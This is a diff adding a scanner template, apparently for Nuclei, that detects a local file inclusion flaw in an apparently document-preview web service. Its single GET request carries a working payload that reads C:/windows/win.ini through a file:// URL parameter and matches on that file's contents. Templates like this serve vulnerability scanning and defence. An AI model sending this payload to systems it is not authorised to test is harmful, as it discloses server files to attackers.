@@ -1,0 +1,26 @@
+id: XVE-2024-2115
+
+info:
+  name: Local File Inclusion Vulnerability
+  author: Cyphercoda
+  severity: high
+  description: Local File Inclusion vulnerability allowing access to local files such as win.ini.
+  tags: lfi, local-file-inclusion, file-disclosure
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/view/qJvqhFt.json?start=1&size=5&url=file%3A%2F%2F%2FC%3A%2Fwindows%2Fwin.ini&idocv_auth=sapi"
+    headers:
+      Host: "your-ip"
+      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+      Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+      Accept-Encoding: "gzip, deflate, br"
+      Connection: "close"
+    matchers:
+      - type: word
+        words:
+          - "[extensions]"
+          - "[mci extensions]"
+        condition: and
+        part: body
